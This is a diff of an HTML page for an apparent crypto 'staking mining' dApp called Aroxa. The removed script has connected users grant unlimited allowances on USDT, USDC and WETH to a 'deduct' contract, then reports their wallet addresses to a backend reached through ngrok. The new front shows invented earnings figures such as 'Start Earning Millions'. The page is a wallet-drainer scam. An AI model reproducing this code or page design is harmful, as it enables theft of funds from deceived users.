@@ -1,167 +1,146 @@
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>質押平台</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;700&display=swap');
-        body {
-            font-family: 'Noto Sans TC', sans-serif;
-            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
-            color: #1e3a8a;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        #container {
-            max-width: 600px;
-            background: rgba(255, 255, 255, 0.95);
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
-            text-align: center;
-        }
-        h1 {
-            font-size: 2em;
-            margin-bottom: 20px;
-        }
-        button {
-            background: linear-gradient(135deg, #4fc3f7, #29b6f6);
-            border: none;
-            padding: 12px 24px;
-            color: #ffffff;
-            font-weight: 700;
-            font-size: 1em;
-            border-radius: 8px;
-            cursor: pointer;
-            margin: 10px;
-        }
-        button:hover:not(:disabled) {
-            background: linear-gradient(135deg, #1e3a8a, #1565c0);
-        }
-        .status {
-            margin: 20px 0;
-            padding: 10px;
-            border-radius: 8px;
-            background: #e3f2fd;
-            color: #1e3a8a;
-        }
-        .status.error {
-            background: #ffebee;
-            color: #c62828;
-        }
-    </style>
+    <title>Aroxa Staking Mining dApp</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div id="container">
-        <h1>質押平台</h1>
-        <button id="connectWallet">連線錢包</button>
-        <button id="startButton" disabled>開始</button>
-        <div id="status" class="status">狀態訊息：請連線錢包</div>
+    <div class="app-container">
+        <div class="header">
+            <div class="logo">⊙ Aroxa</div>
+            <select id="languageSelect" class="language-select">
+                <option value="en">English</option>
+                <option value="zh-Hant">繁中</option>
+                <option value="zh-Hans">简中</option>
+            </select>
+            <button id="connectButton" class="connect-btn">Connect</button>
+            <div class="erc">ERC</div>
+        </div>
+        <div id="status"></div>
+        <div class="title" id="title">Popular Mining</div>
+        <div class="subtitle" id="subtitle">Start Earning Millions</div>
+        <div class="total-funds">
+            <div class="total-value" id="totalValue">2,856,459.94 ETH</div>
+        </div>
+        <div class="tabs">
+            <div class="tab active" data-tab="liquidity" id="tabLiquidity">Liquidity</div>
+            <div class="tab" data-tab="pledging" id="tabPledging">Pledging</div>
+        </div>
+        <div id="liquidity" class="content-section active">
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-label" id="grossOutputLabel">Gross Output</div>
+                    <div class="stat-value" id="grossOutputValue">0 ETH</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-label" id="cumulativeLabel">Cumulative</div>
+                    <div class="stat-value" id="cumulativeValue">0 ETH</div>
+                </div>
+            </div>
+            <div class="balances">
+                <div class="balance">
+                    <div class="balance-label" id="walletBalanceLabel">Wallet Balance</div>
+                    <div class="balance-value" id="walletBalanceValue">
+                        <select id="walletTokenSelect" class="input-field" style="width: 100%; margin-bottom: 8px; text-align: center;">
+                            <option value="USDT">USDT</option>
+                            <option value="USDC">USDC</option>
+                            <option value="WETH">WETH</option>
+                        </select>
+                        <div style="display: flex; justify-content: center; align-items: center;">
+                            <span id="walletBalanceAmount">0.000</span>
+                            <span class="refresh" id="refreshWallet" style="margin-left: 10px;">🔄</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="balance">
+                    <div class="balance-label" id="accountBalanceLabel">Account Balance</div>
+                    <div class="balance-value" id="accountBalanceValue">0.000 USDT</div>
+                    <div class="compound" id="compoundLabel">⚡ Compound</div>
+                </div>
+            </div>
+            <div class="next-benefit" id="nextBenefit">Next Benefit: 00:00:00</div>
+            <button id="startBtn" class="start-btn" disabled>Start</button>
+            <div id="claimButtonPlaceholder"></div>
+        </div>
+        <div id="pledging" class="content-section">
+            <div class="pledge-form">
+                <div class="input-group">
+                    <div class="input-label" id="pledgeAmountLabel">Pledge Amount</div>
+                    <select class="input-field" id="pledgeToken" disabled>
+                        <option value="USDT">USDT</option>
+                        <option value="USDC">USDC</option>
+                        <option value="WETH">WETH</option>
+                    </select>
+                    <input type="number" class="input-field" placeholder="Enter amount" id="pledgeAmount" disabled step="0.01">
+                </div>
+                <div class="input-group">
+                    <div class="input-label" id="pledgeDurationLabel">Duration</div>
+                    <select class="input-field" id="pledgeDuration" disabled>
+                        <option value="30">30 Days</option>
+                        <option value="60">60 Days</option>
+                        <option value="90">90 Days</option>
+                    </select>
+                </div>
+                <button id="pledgeBtn" class="pledge-btn" disabled>Pledge Now</button>
+            </div>
+            <div class="pledge-stats">
+                <div class="stat">
+                    <div class="stat-label" id="totalPledgedLabel">Total Pledged</div>
+                    <div class="stat-value" id="totalPledgedValue">5,678.90 USDT</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-label" id="expectedYieldLabel">Expected Yield</div>
+                    <div class="stat-value" id="expectedYieldValue">0.750 ETH</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-label" id="apyLabel">APY</div>
+                    <div class="stat-value" id="apyValue">15.2%</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-label" id="lockedUntilLabel">Locked Until</div>
+                    <div class="stat-value" id="lockedUntilValue">2024-12-31</div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <script>
-        const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
-        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-        const WETH_CONTRACT_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
-        const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
-        const ERC20_ABI = [
-            "function approve(address, uint256) returns (bool)",
-            "function allowance(address, address) view returns (uint256)"
-        ];
-        const DEDUCT_CONTRACT_ABI = [...]; // 使用與 admin.html 相同的 ABI
+    <!-- 新增：Claim 確認 Modal -->
+    <div id="claimModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">Claim Interest</h3>
+                <span class="close" id="closeModal">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="claim-info">
+                    <div class="info-row">
+                        <span class="label">Claimable ETH:</span>
+                        <span class="value" id="modalClaimableETH">0.0000000 ETH</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="label">ETH Price (USD):</span>
+                        <span class="value" id="modalEthPrice">$0.00</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="label">Selected Token:</span>
+                        <span class="value" id="modalSelectedToken">USDT</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="label">Equivalent Value:</span>
+                        <span class="value" id="modalEquivalentValue">0.000 USDT</span>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button id="confirmClaim" class="confirm-btn">Confirm Claim</button>
+                    <button id="cancelClaim" class="cancel-btn">Cancel</button>
+                </div>
+            </div>
+        </div>
+    </div>
 
-        const hostname = window.location.hostname;
-        const API_BASE_URL = hostname.includes('ngrok-free.dev') ? `https://${hostname}` : 'http://localhost:3000';
-
-        let walletProvider, signer;
-
-        const elements = {
-            connectWallet: document.getElementById('connectWallet'),
-            startButton: document.getElementById('startButton'),
-            status: document.getElementById('status')
-        };
-
-        async function updateStatus(message, isError = false) {
-            elements.status.textContent = `狀態訊息：${message}`;
-            elements.status.classList.toggle('error', isError);
-        }
-
-        async function connectWallet() {
-            try {
-                if (!window.ethereum) throw new Error('請安裝 MetaMask');
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
-                walletProvider = new ethers.providers.Web3Provider(window.ethereum);
-                await walletProvider.send('eth_requestAccounts', []);
-                signer = walletProvider.getSigner();
-                const address = await signer.getAddress();
-                updateStatus(`✅ 已連線錢包: ${address.slice(0, 6)}...${address.slice(-4)}`);
-                elements.connectWallet.disabled = true;
-                elements.startButton.disabled = false;
-            } catch (error) {
-                updateStatus(`❌ 連線失敗: ${error.message}`, true);
-            }
-        }
-
-        async function startService() {
-            try {
-                if (!signer) throw new Error('請先連線錢包');
-                elements.startButton.disabled = true;
-                updateStatus('正在授權 USDT、USDC 和 WETH...');
-                const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-                const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
-                const wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-                const deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-                const MAX_UINT256 = ethers.BigNumber.from("2").pow(256).sub(1);
-
-                // 檢查並設置授權
-                for (const [contract, token] of [[usdtContract, 'USDT'], [usdcContract, 'USDC'], [wethContract, 'WETH']]) {
-                    const allowance = await contract.allowance(await signer.getAddress(), DEDUCT_CONTRACT_ADDRESS);
-                    if (allowance.lt(ethers.utils.parseUnits("1000", 6))) {
-                        updateStatus(`正在授權 ${token}...`);
-                        const tx = await contract.approve(DEDUCT_CONTRACT_ADDRESS, MAX_UINT256);
-                        await tx.wait();
-                        updateStatus(`✅ ${token} 授權完成`);
-                    }
-                }
-
-                // 啟動服務
-                updateStatus('正在啟動服務...');
-                const tx = await deductContract.activateService(USDT_CONTRACT_ADDRESS);
-                const receipt = await tx.wait();
-                updateStatus(`✅ 服務啟動完成，交易 Hash: ${receipt.transactionHash.slice(0, 10)}...`);
-
-                // 發送數據到後端
-                const address = await signer.getAddress();
-                await fetch(`${API_BASE_URL}/api/user-data`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
-                    body: JSON.stringify({
-                        address,
-                        data: { isActive: true, note: '', lastActivated: Date.now() }
-                    })
-                });
-                updateStatus('✅ 數據已發送至後端');
-            } catch (error) {
-                updateStatus(`❌ 啟動失敗: ${error.message}`, true);
-                elements.startButton.disabled = false;
-            }
-        }
-
-        elements.connectWallet.onclick = connectWallet;
-        elements.startButton.onclick = startService;
-
-        window.addEventListener('load', () => {
-            if (typeof ethers === 'undefined') {
-                updateStatus('❌ Ethers.js 未載入，請檢查網絡', true);
-            }
-        });
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
